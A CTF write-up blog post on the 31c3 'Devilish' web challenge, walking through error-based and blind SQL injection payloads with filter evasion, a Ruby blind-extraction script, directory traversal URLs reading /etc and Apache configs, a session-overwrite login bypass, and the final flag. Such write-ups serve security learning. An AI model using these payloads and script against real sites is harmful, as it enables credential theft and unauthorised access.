Author: zlowram
Date: 12-29-2014 9:05
Title: 31c3ctf Web Devilish write-up
Template: post
Comments: enabled


In this challenge we were given access to a public website that they tell to be
devilish, and might be hiding a private portal.

We had different menu entries but the two standing out were the login and
members page, which allowed to view the user's profile.

The login is not vulnearble to SQLi so better focus on the profile pages: 

```markup
http://188.40.18.70/PROFILE/55/Dracula
```

By fuzzing the 55 you can get to break the query with a backslash, obtaining
this way a nice and verbose error:

```markup
<!--SELECT * FROM users WHERE id_user='55\' AND Us3rN4m3='Dracula'-->

You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right syntax to use near
'Dracula'' at line 1
```

With this error, you see that Us3rN4m3 is also injectable, so the SQLi query
must be placed there. Exploiting an error based SQLi should be easy, but in
this case many important keywords and characters are filtered, such as SCHEMA,
TABLE, LIKE, HAVING, whitespaces, single quotes, comments, etc.

By applying some [filter evasion techniques](https://websec.wordpress.com/2010/03/19/exploiting-hard-filtered-sql-injections/) and the [extractvalue()](http://kaoticcreations.blogspot.com.es/p/xpath-injection-using-extractvalue.html)
clause you gan get a working injection that returns the username of a given
id_user:

```markup
http://188.40.18.70/PROFILE/asd\/||extractvalue(null,concat(0x3a,(select%09Us3rN4m3%09from%09users%09where%09id_user=54)))--%09
```

Since the column names are unknown and the information_schema table cannot
be used because of the filter, the only way of getting them is by producing
an error such as "duplicate colum name 'id_user'". This can be achieved by
using a double query and joining the users table with itself, which will
duplicate all the columns of the table. Therefore, the query that will leak the
column names is:

```markup
http://188.40.18.70/PROFILE/asd\/||(SELECT%09*%09FROM%09(SELECT%09*%09FROM%09users%09join%09users%09b%09USING%09(id_user))%09a)--%09
```

This query returns an error that says "Duplicate column name 'Us3rN4m3'", so in
order to get all the column names, the known names must be placed within the
USING clause. By doing this you can get all the column names:

```markup
Us3rN4m3, id_user, Em4iL4dR3Szz, S4cR3dT3xT0Fm3, MyPh0N3NumB3RHAHA, Addr3Zz0F_tHi5_D3wD, CHAR_LOL, P4sWW0rD_0F_M3_WTF
```

To extract the passwords from the colum "P4sWW0rD_0F_M3_WTF", the extractvalue
clause cannot be used because it has a length limitation and the passwords are
too long. The way of getting the passwords is blindly, so we construct the base
injection query:

```markup
http://188.40.18.70/PROFILE/asd\/||locate(0x61,(select%09P4sWW0rD_0F_M3_WTF%09from%09users%09where%09id_user=54),1)=1--%09
```

This will try to locate the character 'a' (0x61) in the string returned by the
select statement, starting at position 1. If the result is equal to 1 then the
'a' character is the first one of the password.

In order to automate the password extraction task a script like the following
can be used:

```ruby
#!/usr/bin/env ruby
# by zlowram (@zlowram_)

require 'net/http'

alphabet = ("a".."z").to_a + ("0".."9").to_a

found_char = true
i=1
print "Password: "

while found_char do
  found_char = false
  alphabet.each{|letter|
    encoded_url = URI.escape("http://188.40.18.70/PROFILE/asd\\/||locate(0x"+letter.ord.to_s(16)+",(select%09P4sWW0rD_0F_M3_WTF%09from%09users%09where%09id_user=55),"+i.to_s+")="+i.to_s+"--%09")
    uri = URI.parse(encoded_url)

    res = Net::HTTP.get_response(uri)

    if (res.body =~ /KiTTyKiTTy/) != nil 
      print letter
      found_char = true
      break
    end 
  }
  i = i+1 
end
```

(Note: Here is the point we could reach within time, the rest of the challenge
was done after the CTF was closed.)

Once logged in with the recently obtained credentials it can be observed a new
menu entry: "ACCESS". This section has two functionalities "browse" and
"upload", from wich the uploader appear to be broken.

The "browse" action has a Directory Traversal vulnerability that allows to list
all the directories system-wide:

```markup
http://188.40.18.70/ACCESS?action=browse&dir=../../../../../../etc/
```

This vulnerability allow to list the source code files of the application to
later access it directly and see their contents:

```markup
http://188.40.18.70/ACCESS?action=browse&dir=../../../../../../var/www/html
```

```markup
http://188.40.18.70/__WebSiteFuckingPrivateContentNotForPublic666/LOGIN_HEAD
```

The source code of the web does not tell anything new yet so better try to find
useful information with the directory traversal, which can be found in the
apache2 sites-enabled directory:

```markup
http://188.40.18.70/ACCESS?action=browse&dir=../../../../../../etc/apache2/sites-enabled
```

It appear that a different vhost is available so the html root dir is 
somewhere in the system. Actually, it is in the home directory:

```markup
http://188.40.18.70/ACCESS?action=browse&dir=../../../../../../home/devilish.local
```

To access to this vhost the easiest thing is to add an entry to the /etc/hosts
file in your machine. This allows to access to the private part of portal,
which also contains a login form.

By extrapolating the source code filenames it is possible to read the LOGIN_HEAD
file, which contains the source code of the login:

```php
<?php
    if(@$_SESSION['is_ExclusiveMember']){header("location: ".$LINK);die();}
    if(isset($_POST['user'])){
        if(@$_POST['user']===$uLOGIN && @$_POST['pass']===$uPASSWORD){
            $_SESSION['is_ExclusiveMember']=1;
            header("location: ".$LINK);
            die();
        }else{
            $Error=1;
        }
    }
?>;
```

In order to log in, the session variable named 'is_ExclusiveMember' must be set
to 1. This can be done by sending it via POST in the public login form, as seen
in the LOGIN_HEAD code of the public site ($_SESSION=$_POST):

```php
<?php
    if(@$_SESSION['user']){header("location: ".$LINK);die();}
    if(isset($_POST['user'])){
        if(mysqli_num_rows(mysqli_query($con,"SELECT * FROM users WHERE Us3rN4m3='".mysqli_real_escape_string($con,@$_POST['user'])."' AND P4sWW0rD_0F_M3_WTF='".mysqli_real_escape_string($con,@$_POST['pass'])."' "))>0){
            $_SESSION=$_POST;
            header("location: ".$LINK);die();
        }else{
            $Error=1;
        }
    }
?>
```

Once logged in with the 'is_ExclusiveMember' value set to 1, the flag can be
obtained by simply accessing the devilish.local vhost.

```markup
31c3_Th3r3_4R3_D3v1li5h_Th0ght5_ev3N_1N_th3_M0sT_4ng3l1c_M1nd5
```

Greetings to my team, [Insanity](http://ka0labs.net), and specially to Xassiz and Kenkeiras for their
help in this one!

### Useful resources
 * [SQL Injection knowledge base](http://websec.ca/kb/sql_injection)
